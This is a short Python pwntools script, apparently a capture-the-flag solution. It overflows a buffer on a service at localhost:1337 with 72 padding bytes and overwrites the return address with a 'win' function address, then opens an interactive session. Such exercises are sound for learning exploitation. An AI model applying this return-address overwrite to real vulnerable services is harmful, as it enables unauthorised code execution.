from pwn import *


p = remote("localhost", 1337)

print(p.recvuntil(b"data:").decode())

win_addr = p64(0x00400668)
payload = b"A"*64 + b"B"*8 + win_addr

p.send(payload)

resp = p.recvline()
print(resp.decode())

p.interactive()

p.close()

